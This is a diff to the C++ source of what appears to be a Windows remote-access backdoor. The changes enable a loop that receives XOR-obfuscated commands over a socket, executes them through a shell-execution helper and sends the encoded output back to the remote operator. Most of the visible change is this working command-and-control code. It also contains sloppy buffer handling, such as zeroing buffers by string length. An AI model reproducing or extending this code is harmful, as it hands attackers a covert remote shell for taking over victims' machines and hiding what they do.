@@ -2,38 +2,18 @@
 using namespace std;
 
 #include "../inc/master.h"
-//#include "../inc/Exec.h"
+#include "../inc/Exec.h"
 
 using namespace std;
 
 #include <iostream>
-#define UNICODE
-#define _UNICODE
+//#define UNICODE
+//#define _UNICODE
 
-wstring testlol()
-{   
-    WCHAR tazmail[21] =L"juan";
-    return (wstring) tazmail;
-}
-
-int find_last_backslash(wstring &find_me)
-{
-    //
-    int index = 0;
-    for(int i=0; i < find_me.length(); i++)
-    {
-        if(find_me.at(i) == L'\\')
-        {
-            wcout << "back slash find: "<< i << endl;
-            index = i;
-        }
-    }
-    return index + 1;
-}
 
 //https://stackoverflow.com/questions/6693010/how-do-i-use-multibytetowidechar
 
-wstring ConvertUtf8ToWide(const string& str)
+wstring ConvertUtf8ToWidee(const string& str)
 {
     int count = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), NULL, 0);
     wstring wstr(count, 0);
@@ -42,7 +22,7 @@ wstring ConvertUtf8ToWide(const string& str)
 }
 
 
-wstring XOREncryption(wstring data) //Do not use strlen on XOREncryption
+wstring XORencryption(wstring data) //Do not use strlen on XOREncryption
 {
     //        print("i: ",i,"current: ",current, " | current key: ", current_key, " | char xor",char_xor )
 
@@ -80,7 +60,7 @@ int main()
     //wstring test = L"Ελληνικά";
     //wcout << test.length() << endl;
     SetConsoleOutputCP(CP_UTF8);
-    SetConsoleCP(CP_UTF8);
+    //SetConsoleCP(CP_UTF8);
     WSADATA WSAData; 
     
     SOCKET sock;
@@ -105,6 +85,7 @@ int main()
     } 
 
     CHAR buff_char[4096];
+    WCHAR buff_wchar[4096];
 
     string command;
     wstring w_cmd;
@@ -113,47 +94,42 @@ int main()
 
     int stat,len_MultiByteToWideChar;
 
-    
-    //char test[] = "Ελληνικά";
-    //cout << strlen(test) << endl;
-
-    //send(sock, test, sizeof(test), 0);
-
-    /*
-
     vector <string> utf8exec;
 
     _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
     while(true)
     {
-        ZeroMemory(&buff_char, sizeof(buff_char));
-        w_cmd.erase();
-       // recv(sock, buff_char, sizeof(buff_char), 0);
-      //  cout << "Commande: " <<  buff_char << endl;
-     //   w_cmd = ConvertUtf8ToWide( XOREncryption((string) buff_char) );
+        ZeroMemory(&buff_char, strlen(buff_char));
+        ZeroMemory(&buff_wchar, wcslen(buff_wchar));
 
-        utf8exec =  Exec().executeCommand(L"dir");
+        w_cmd.erase();
+        recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
+        wcout << "Commande: " <<  buff_wchar << endl;
+        //w_cmd = ConvertUtf8ToWide( XOREncryption((string) buff_char) );
+        w_cmd = XORencryption((wstring) buff_wchar);
+
+        utf8exec =  Exec().executeCommand(w_cmd);
 
         for(int i = 0;i < utf8exec.size(); i++)
         {
-            w_cmd = ConvertUtf8ToWide(utf8exec[i]);
-            w_cmd = XOREncryption(w_cmd);
+            w_cmd = ConvertUtf8ToWidee(utf8exec[i]);
+            w_cmd = XORencryption(w_cmd);
            // for(int i=0; i< w_cmd.length(); i++)
            // {
             //    wcout << "i: " << i << " char: " << w_cmd.at(i) << endl;
             //}
 
             wcout << w_cmd.length() <<endl;
-           // wcout << XOREncryption(w_cmd).length() << endl; 
+           
             send(sock,(char *)w_cmd.c_str(), w_cmd.length() * sizeof(WCHAR),   0);
-            wcout << "send : " << i << endl;
+            wcout << "send : " << w_cmd << endl;
             wcout << "len cmd: " << utf8exec[i].length() << endl;
             Sleep(300);
         }
-        send(sock,(char *) XOREncryption(L"\r\n").c_str(), 4 ,0);
+        send(sock,(char *) XORencryption(L"\r\n").c_str(), 4 ,0);
         exit(0);
     }
-    */
+    
     return 0;
 }
 
